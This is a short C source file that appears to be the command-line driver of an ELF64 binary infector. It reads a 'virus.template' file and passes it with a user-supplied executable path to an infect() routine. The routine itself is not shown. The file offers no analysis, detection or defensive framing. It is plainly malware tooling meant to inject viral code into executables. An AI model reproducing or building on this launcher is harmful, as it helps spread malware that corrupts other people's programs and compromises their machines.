#include <lib.h>

int fail(char *reason){
	print("FAIL: ");
	print(reason);
	println("");
	return 1;
}

int usage(char *name){
	print("usage: ./");
	print(name);
	print(" binary\n\nnote: the binary must be in elf64\n");
	return -1;
}

int main(int ac, char **av){
	if (ac < 2){
		return usage(av[0]);
	}
	char *template; size_t n;
	fget("bin/virus.template", &template, &n);
	return infect(av[1], template, n) == FALSE;
}